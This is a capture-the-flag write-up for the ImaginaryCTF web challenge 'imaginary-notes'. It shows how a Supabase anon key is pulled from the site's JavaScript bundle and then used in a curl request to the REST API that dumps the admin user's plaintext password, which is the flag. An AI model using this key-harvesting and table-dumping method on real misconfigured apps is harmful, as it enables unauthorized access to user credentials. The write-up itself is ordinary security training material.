## Challenge Writeup: imaginary-notes

**Category:** Web

### Challenge Description

The challenge provided a note-taking web app hosted at:

```
http://imaginary-notes.chal.imaginaryctf.org
```

The description hinted that:

* The **flag** is stored as the password for the `admin` account.
* The backend uses **Supabase**.
* An **anonymous key (anon key)** is somewhere in the frontend.
* The table storing passwords is called `users`.

---

### Step 1: Inspecting the Frontend for the Anon Key

Supabase projects use a public `anon key` to allow client-side code to interact with the database.

1. Open the website in a browser.
2. Open **Developer Tools → Sources tab**.
3. Search for JS files:

In the JS bundle (`http://imaginary-notes.chal.imaginaryctf.org/_next/static/chunks/app/page-d6e80645a3072dd9.js`), I found:

```js
        a(5647).UU)("https://dpyxnwiuwzahkxuxrojp.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI");
);
```

From this code we get the following details:

* **Project URL:** `https://dpyxnwiuwzahkxuxrojp.supabase.co`
* **Anon key:** eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI

---

### Step 2: Querying the `users` Table

With the anon key, the Supabase REST API allows us to query tables directly.

**Target:** `users` table, filter for `username = admin`.

```bash
curl "https://dpyxnwiuwzahkxuxrojp.supabase.co/rest/v1/users?username=eq.admin" \
  -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI" \
  -H "Accept: application/json"
```
**Response:**

```json
[
  {
    "id":"5df6d541-c05e-4630-a862-8c23ec2b5fa9",
    "username":"admin",
    "password":"ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"
  }
]
```

The `"password"` field contains the **flag**.

---

### Step 3: Flag

```
ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}
```